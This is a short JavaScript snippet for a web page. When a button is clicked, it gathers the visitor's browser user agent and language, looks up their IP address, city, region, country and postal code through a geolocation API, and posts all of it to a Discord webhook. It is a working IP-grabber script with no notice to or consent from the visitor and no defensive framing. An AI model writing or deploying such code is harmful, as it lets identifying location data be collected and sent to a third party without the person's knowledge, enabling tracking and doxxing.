document.getElementById('collectData').addEventListener('click', async () => {
  const userAgent = navigator.userAgent;
  const language = navigator.language;

  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();
  const { ip, city, region, country, postal } = data;

  const userData = {
    userAgent,
    language,
    ip,
    city,
    region,
    country,
    postal,
  };

  sendToDiscordWebhook(userData);
});

function sendToDiscordWebhook(userData) {
  // Replace with your Discord webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/...';

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: `User data:\n\`\`\`json\n${JSON.stringify(userData, null, 2)}\n\`\`\``,
    }),
  });
}
